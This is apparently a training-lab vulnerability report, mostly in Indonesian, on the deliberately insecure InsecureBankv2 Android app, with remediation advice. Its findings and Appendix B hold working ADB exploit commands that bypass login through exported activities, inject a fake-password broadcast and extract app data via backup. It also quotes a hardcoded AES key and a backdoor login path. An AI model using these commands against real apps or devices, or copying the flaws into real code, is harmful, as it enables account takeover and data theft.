# Lab 2: Hardcoded Secrets & Exported Components — Vulnerability Assessment Report

**Target**: InsecureBankv2 (`com.android.insecurebankv2`)  
**Date**: 2026-07-13  
**Methodology**: Static Analysis (JADX Decompilation + AndroidManifest Review) + Dynamic Exploitation (ADB PoC)  
**CWE**: CWE-927 (Exported Components), CWE-321 (Hardcoded Key), CWE-798 (Backdoor Account)

---

## Executive Summary

Aplikasi **InsecureBankv2** mengandung **6 komponen yang diekspor secara tidak aman** (`android:exported="true"`) termasuk halaman dashboard utama `.PostLogin`, halaman transfer `.DoTransfer`, dan halaman ganti password `.ChangePassword`. Hal ini memungkinkan **bypass autentikasi total** — seorang penyerang dapat meluncurkan langsung halaman-halaman sensitif melalui ADB tanpa kredensial apapun. Selain itu, ditemukan **AES encryption key hardcoded** (`"This is the super secret key 123"`) dan **akun backdoor hardcoded** (`"devadmin"`).

**Total Findings**: 6 (Critical: 2, High: 3, Medium: 1)

---

## Findings

### Finding 1: Authentication Bypass via Exported PostLogin Activity

| Field | Value |
|-------|-------|
| **ID** | ISB-EXPORT-001 |
| **Confidence** | Confirmed (PoC) |
| **Severity** | Critical (CVSS 4.0: 9.8) |
| **CWE** | CWE-927 |
| **OWASP MASVS** | MASVS-PLATFORM-1 |

#### Description

Aktivitas `PostLogin` (dashboard utama setelah login) dideklarasikan dengan `android:exported="true"` di AndroidManifest. Akibatnya, aktivitas ini dapat dipanggil langsung dari luar aplikasi tanpa melalui proses autentikasi. Ini adalah celah **Authentication Bypass** yang memungkinkan penyerang mengakses seluruh fungsionalitas banking tanpa kredensial.

#### Affected Component

- **Manifest**: `AndroidManifest.xml:52`
- **Source**: `com/android/insecurebankv2/PostLogin.java`

#### Manifest Evidence

```xml
<activity
    android:label="@string/title_activity_post_login"
    android:name="com.android.insecurebankv2.PostLogin"
    android:exported="true"/>
```

#### Code Analysis

`PostLogin.java` menerima `uname` dari intent extras (opsional) dan menyediakan akses ke:
- Transfer dana (DoTransfer)
- View statement
- Change password

Tanpa `uname` pun, dashboard tetap dapat diakses dan semua tombol navigasi berfungsi.

#### Proof of Concept (Confirmed)

```powershell
# Bypass langsung ke dashboard
adb shell am start -n com.android.insecurebankv2/.PostLogin
# Result: SUCCESS - Dashboard terbuka tanpa autentikasi
```

#### Impact

| CIA Triad | Level |
|-----------|-------|
| Confidentiality | Critical — akses ke statement, transfer, password change |
| Integrity | Critical — transfer dana, ganti password tanpa login |
| Availability | None |

#### Remediation

```xml
<!-- Hapus exported="true" atau set ke false -->
<activity
    android:name="com.android.insecurebankv2.PostLogin"
    android:exported="false"/>
```

```java
// Tambahkan pengecekan autentikasi di onCreate()
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    if (!isUserAuthenticated()) {
        finish();
        return;
    }
    // ...
}
```

---

### Finding 2: Exported Activities (DoTransfer, ChangePassword, ViewStatement)

| Field | Value |
|-------|-------|
| **ID** | ISB-EXPORT-002 |
| **Confidence** | Confirmed (PoC) |
| **Severity** | Critical (CVSS 4.0: 9.1) |
| **CWE** | CWE-927 |
| **OWASP MASVS** | MASVS-PLATFORM-1 |

#### Description

Tiga aktivitas sensitif lainnya juga diekspor: `DoTransfer` (transfer dana), `ChangePassword` (ganti password), dan `ViewStatement` (melihat statement). Masing-masing dapat dipanggil langsung via ADB tanpa autentikasi.

#### Affected Components

| Component | Manifest Line | Function |
|-----------|---------------|----------|
| `DoTransfer` | 59 | Transfer uang antar rekening |
| `ViewStatement` | 63 | Melihat statement bank |
| `ChangePassword` | 78 | Mengganti password pengguna |

#### Manifest Evidence

```xml
<activity android:name="com.android.insecurebankv2.DoTransfer"
    android:exported="true"/>
<activity android:name="com.android.insecurebankv2.ViewStatement"
    android:exported="true"/>
<activity android:name="com.android.insecurebankv2.ChangePassword"
    android:exported="true"/>
```

#### Proof of Concept (Confirmed)

```powershell
adb shell am start -n com.android.insecurebankv2/.DoTransfer     # SUCCESS
adb shell am start -n com.android.insecurebankv2/.ChangePassword  # SUCCESS
adb shell am start -n com.android.insecurebankv2/.ViewStatement   # SUCCESS
```

#### Impact

Penyerang dapat:
- **DoTransfer**: Mengirim dana dari akun korban (jika shared preferences terisi)
- **ChangePassword**: Mengganti password korban (mengambil alih akun)
- **ViewStatement**: Melihat riwayat transaksi dan statement bank

#### Remediation

Set `android:exported="false"` pada semua aktivitas internal. Tambahkan permission checks atau authentication gates.

---

### Finding 3: Exported ContentProvider & BroadcastReceiver

| Field | Value |
|-------|-------|
| **ID** | ISB-EXPORT-003 |
| **Confidence** | Confirmed |
| **Severity** | High (CVSS 4.0: 7.8) |
| **CWE** | CWE-927, CWE-926 |
| **OWASP MASVS** | MASVS-PLATFORM-1 |

#### Description

`TrackUserContentProvider` dan `MyBroadCastReceiver` diekspor tanpa proteksi. ContentProvider melacak username yang login dan dapat di-query oleh aplikasi lain. BroadcastReceiver menerima broadcast `theBroadcast` yang membawa password baru dan nomor telepon — dapat ditrigger oleh penyerang.

#### Affected Components

| Component | Manifest Line | Risk |
|-----------|---------------|------|
| `TrackUserContentProvider` | 66 | Data leakage — usernames terekspos |
| `MyBroadCastReceiver` | 70 | Broadcast injection — penyerang dapat mengirim password palsu |

#### Manifest Evidence

```xml
<provider
    android:name="com.android.insecurebankv2.TrackUserContentProvider"
    android:exported="true"
    android:authorities="com.android.insecurebankv2.TrackUserContentProvider"/>
<receiver
    android:name="com.android.insecurebankv2.MyBroadCastReceiver"
    android:exported="true">
    <intent-filter>
        <action android:name="theBroadcast"/>
    </intent-filter>
</receiver>
```

#### Code Analysis — TrackUserContentProvider

```java
// Table structure: names (id, name)
// Stores usernames of users who logged in
static final String CREATE_DB_TABLE = 
    " CREATE TABLE names (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL);";
```

Content URI: `content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers`

#### Code Analysis — MyBroadCastReceiver

```java
// Menerima broadcast "theBroadcast" dengan extras:
// - "newpass" (password baru)
// - "phonenumber" (nomor telepon)
// Mencetak kombinasi ke System.out.println tanpa validasi
System.out.println("For the changepassword - phonenumber: " + textPhoneno +
    " password is: " + textMessage);
```

#### Proof of Concept (Confirmed)

```powershell
# Broadcast injection ke receiver yang diekspor
adb shell am broadcast -a theBroadcast \
    -n com.android.insecurebankv2/.MyBroadCastReceiver \
    --es newpass "hacked_pass" \
    --es phonenumber "08123456789"
# Result: Broadcast completed: result=0

# Query content provider (saat app process berjalan)
adb shell content query \
    --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
```

#### Remediation

```xml
<provider android:name="..." android:exported="false">
    <!-- Atau tambahkan permission: android:permission="..." -->
</provider>
<receiver android:name="..." android:exported="false"/>
```

---

### Finding 4: Hardcoded AES Encryption Key

| Field | Value |
|-------|-------|
| **ID** | ISB-SECRET-001 |
| **Confidence** | Confirmed |
| **Severity** | High (CVSS 4.0: 7.5) |
| **CWE** | CWE-321 |
| **OWASP MASVS** | MASVS-CRYPTO-1 |

#### Description

Aplikasi menggunakan AES-CBC untuk mengenkripsi password yang disimpan di SharedPreferences, namun **kunci enkripsi di-hardcode dalam source code** dan IV vector diset ke semua nol. Siapa pun yang mendekompilasi APK dapat mengekstrak kunci dan mendekripsi semua password yang tersimpan.

#### Affected Component

- **File**: `com/android/insecurebankv2/CryptoClass.java`
- **Line**: 22-23

#### Code Evidence

```java
public class CryptoClass {
    String key = "This is the super secret key 123";
    byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    // ...
    public String aesDeccryptedString(String theString) {
        byte[] keyBytes = this.key.getBytes("UTF-8");
        this.cipherData = aes256decrypt(this.ivBytes, keyBytes,
                            Base64.decode(theString.getBytes("UTF-8"), 0));
        return new String(this.cipherData, "UTF-8");
    }
}
```

#### Impact

| Aspek | Detail |
|-------|--------|
| Kunci | `"This is the super secret key 123"` — hardcoded plaintext |
| IV | `{0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0}` — all zeros (CWE-325) |
| Mode | AES-256/CBC/PKCS5Padding |
| Data target | `"superSecurePassword"` di SharedPreferences |

Seorang attacker yang memiliki akses ke device (via backup `adb backup` atau akses root) dapat:
1. Mengekstrak SharedPreferences XML
2. Mendekompilasi APK untuk mendapatkan kunci
3. Mendekripsi password korban

#### Remediation

```java
// Gunakan Android Keystore untuk menyimpan kunci
KeyGenerator keyGenerator = KeyGenerator.getInstance(
    KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore");
keyGenerator.init(
    new KeyGenParameterSpec.Builder("MyKeyAlias",
        KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)
        .setBlockModes(KeyProperties.BLOCK_MODE_CBC)
        .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7)
        .build());

// Gunakan EncryptedSharedPreferences (AndroidX Security)
MasterKey masterKey = new MasterKey.Builder(context)
    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
    .build();
SharedPreferences prefs = EncryptedSharedPreferences.create(context,
    "secure_prefs", masterKey, ...);
```

---

### Finding 5: Hardcoded Backdoor Account (devadmin)

| Field | Value |
|-------|-------|
| **ID** | ISB-SECRET-002 |
| **Confidence** | Confirmed |
| **Severity** | High (CVSS 4.0: 8.1) |
| **CWE** | CWE-798 |
| **OWASP MASVS** | MASVS-AUTH-1 |

#### Description

Username hardcoded `"devadmin"` berfungsi sebagai akun backdoor. Ketika username ini digunakan saat login, aplikasi mengarahkan request ke endpoint `/devlogin` alih-alih `/login`, yang berpotensi mem-bypass mekanisme autentikasi normal.

#### Affected Component

- **File**: `com/android/insecurebankv2/DoLogin.java`
- **Line**: 103

#### Code Evidence

```java
HttpPost httppost = new HttpPost(protocol + serverip + ":" + serverport + "/login");
HttpPost httppost2 = new HttpPost(protocol + serverip + ":" + serverport + "/devlogin");

if (DoLogin.this.username.equals("devadmin")) {
    httppost2.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost2);  // Backdoor path
} else {
    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost);   // Normal path
}
```

#### Impact

Akun backdoor `"devadmin"` memungkinkan akses developer ke endpoint khusus yang mungkin memiliki:
- Validasi kredensial yang lebih lemah atau tidak ada
- Privilege escalation
- Akses ke data sensitif yang tidak tersedia di flow normal

#### Remediation

```java
// Hapus hardcoded backdoor account sepenuhnya
// Gunakan role-based access control (RBAC) dari server-side
// Jangan embed kredensial khusus di kode client
```

---

### Finding 6: Debuggable Application & Data Backup Enabled

| Field | Value |
|-------|-------|
| **ID** | ISB-CONFIG-001 |
| **Confidence** | Confirmed |
| **Severity** | Medium (CVSS 4.0: 5.9) |
| **CWE** | CWE-215, CWE-200 |
| **OWASP MASVS** | MASVS-RESILIENCE-2 |

#### Description

Aplikasi dikompilasi dengan `android:debuggable="true"` dan `android:allowBackup="true"`. Ini memungkinkan debugging runtime dan ekstraksi data aplikasi via ADB.

#### Manifest Evidence

```xml
<application
    android:debuggable="true"
    android:allowBackup="true"
    ...>
```

#### Impact

- `debuggable="true"`: Attacker dapat menggunakan `run-as` untuk membaca file aplikasi, memory dump, dan attach debugger
- `allowBackup="true"`: Attacker dapat mengekstrak SharedPreferences (termasuk password terenkripsi) via `adb backup`

#### Proof of Concept

```powershell
# Backup seluruh data aplikasi
adb backup -f backup.ab com.android.insecurebankv2

# Akses direktori aplikasi (karena debuggable)
adb shell run-as com.android.insecurebankv2 ls /data/data/com.android.insecurebankv2/
```

#### Remediation

```xml
<application
    android:debuggable="false"
    android:allowBackup="false"
    ...>
```

---

## Remediation Summary

| ID | Severity | Component | Fix |
|----|----------|-----------|-----|
| ISB-EXPORT-001 | Critical | PostLogin | Set `android:exported="false"`, tambah auth check |
| ISB-EXPORT-002 | Critical | DoTransfer, ChangePassword, ViewStatement | Set `android:exported="false"` |
| ISB-EXPORT-003 | High | TrackUserContentProvider, MyBroadCastReceiver | Set `exported="false"` dan tambah permission |
| ISB-SECRET-001 | High | CryptoClass.java | Gunakan Android Keystore + EncryptedSharedPreferences |
| ISB-SECRET-002 | High | DoLogin.java | Hapus akun backdoor `devadmin` |
| ISB-CONFIG-001 | Medium | AndroidManifest.xml | Set `debuggable="false"`, `allowBackup="false"` |

### Manifest Remediation

```xml
<application
    android:debuggable="false"
    android:allowBackup="false">

    <!-- Hanya export LAUNCHER activity -->
    <activity android:name=".LoginActivity" android:exported="true">
        <intent-filter>
            <action android:name="android.intent.action.MAIN"/>
            <category android:name="android.intent.category.LAUNCHER"/>
        </intent-filter>
    </activity>

    <!-- Semua aktivitas internal: exported="false" -->
    <activity android:name=".PostLogin" android:exported="false"/>
    <activity android:name=".DoTransfer" android:exported="false"/>
    <activity android:name=".ViewStatement" android:exported="false"/>
    <activity android:name=".ChangePassword" android:exported="false"/>

    <!-- ContentProvider & Receiver: exported="false" atau tambah signature permission -->
    <provider android:name=".TrackUserContentProvider"
        android:exported="false"
        android:authorities="com.android.insecurebankv2.TrackUserContentProvider"/>
    <receiver android:name=".MyBroadCastReceiver" android:exported="false"/>
</application>
```

---

## Coverage Statement

```
Coverage Analysis:
- Static Analysis: Complete (AndroidManifest.xml + all app source files decompiled)
- Dynamic Analysis: Complete (all exported activities bypassed via ADB PoC)
- Scope: com.android.insecurebankv2.* namespace
- Excluded: com.google.*, android.*, 3rd-party libraries

Files Analyzed:
  - AndroidManifest.xml (100 lines)
  - com/android/insecurebankv2/CryptoClass.java (hardcoded key + IV)
  - com/android/insecurebankv2/PostLogin.java (bypass target)
  - com/android/insecurebankv2/DoLogin.java (backdoor account)
  - com/android/insecurebankv2/DoTransfer.java (exported + insecure)
  - com/android/insecurebankv2/ChangePassword.java (exported)
  - com/android/insecurebankv2/ViewStatement.java (exported)
  - com/android/insecurebankv2/TrackUserContentProvider.java (exported provider)
  - com/android/insecurebankv2/MyBroadCastReceiver.java (exported receiver)
  - res/values/strings.xml (is_admin flag)

Dynamic Tests Performed:
  [PASS] adb shell am start -n .../.PostLogin
  [PASS] adb shell am start -n .../.DoTransfer
  [PASS] adb shell am start -n .../.ChangePassword
  [PASS] adb shell am start -n .../.ViewStatement
  [PASS] adb shell am broadcast ... MyBroadCastReceiver exploit
  [INFO] adb shell content query ... (provider confirmed exported)

Total Findings: 6 (Critical: 2, High: 3, Medium: 1)
```

---

## Tools Used

| Tool | Version | Path |
|------|---------|------|
| Java JDK (Temurin) | 17.0.14 | `C:\jdk-17` |
| JADX | 1.5.3 | `C:\jadx` |
| ADB | 37.0.0 | `C:\Users\LENOVO\AppData\Local\Android\Sdk\platform-tools` |
| Android Emulator | Pixel_8 (SDK 36) | `C:\Users\LENOVO\AppData\Local\Android\Sdk\emulator` |
| PowerShell (Select-String) | 5.1 | Built-in |

---

## References

- [CWE-927: Use of Implicit Intent for Sensitive Communication](https://cwe.mitre.org/data/definitions/927.html)
- [CWE-321: Use of Hard-coded Cryptographic Key](https://cwe.mitre.org/data/definitions/321.html)
- [CWE-798: Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- [CWE-215: Insertion of Sensitive Information Into Debugging Code](https://cwe.mitre.org/data/definitions/215.html)
- [OWASP MASVS-PLATFORM-1](https://mas.owasp.org/MASVS/05-MASVS-PLATFORM/)
- [OWASP MASVS-CRYPTO-1](https://mas.owasp.org/MASVS/04-MASVS-CRYPTO/)
- [Android Security: Exported Components](https://developer.android.com/privacy-and-security/risks/android-exported)
- [Android Keystore System](https://developer.android.com/privacy-and-security/cryptography#android-keystore)
- [Android-InsecureBankv2 Repository](https://github.com/dineshshetty/Android-InsecureBankv2)

---

## Appendix A: Complete AndroidManifest.xml (Annotated)

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.android.insecurebankv2">
    <application
        android:debuggable="true"           <!-- CWE-215: Debug mode enabled -->
        android:allowBackup="true">         <!-- CWE-200: Backup allowed -->
        
        <activity android:name=".LoginActivity">  <!-- Only properly exported -->
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
        <activity android:name=".PostLogin"
            android:exported="true"/>       <!-- ISB-EXPORT-001: Auth bypass -->
        <activity android:name=".DoTransfer"
            android:exported="true"/>       <!-- ISB-EXPORT-002: Transfer bypass -->
        <activity android:name=".ViewStatement"
            android:exported="true"/>       <!-- ISB-EXPORT-002: Statement bypass -->
        <activity android:name=".ChangePassword"
            android:exported="true"/>       <!-- ISB-EXPORT-002: Password bypass -->
        
        <provider android:name=".TrackUserContentProvider"
            android:exported="true"/>       <!-- ISB-EXPORT-003: Data leakage -->
        <receiver android:name=".MyBroadCastReceiver"
            android:exported="true">        <!-- ISB-EXPORT-003: Broadcast injection -->
            <intent-filter>
                <action android:name="theBroadcast"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
```

---

## Appendix B: Exploit One-Liners

```powershell
# Set ADB path
$adb = "C:\Users\LENOVO\AppData\Local\Android\Sdk\platform-tools\adb.exe"

# Bypass 1: Dashboard tanpa login
& $adb shell am start -n com.android.insecurebankv2/.PostLogin

# Bypass 2: Transfer dana tanpa login
& $adb shell am start -n com.android.insecurebankv2/.DoTransfer

# Bypass 3: Ganti password tanpa login
& $adb shell am start -n com.android.insecurebankv2/.ChangePassword

# Bypass 4: View statement tanpa login
& $adb shell am start -n com.android.insecurebankv2/.ViewStatement

# Bypass 5: Injeksi broadcast ke receiver
& $adb shell am broadcast -a theBroadcast ``
    -n com.android.insecurebankv2/.MyBroadCastReceiver ``
    --es newpass "hacked" --es phonenumber "08123456789"

# Backup data aplikasi
& $adb backup -f backup.ab com.android.insecurebankv2
```
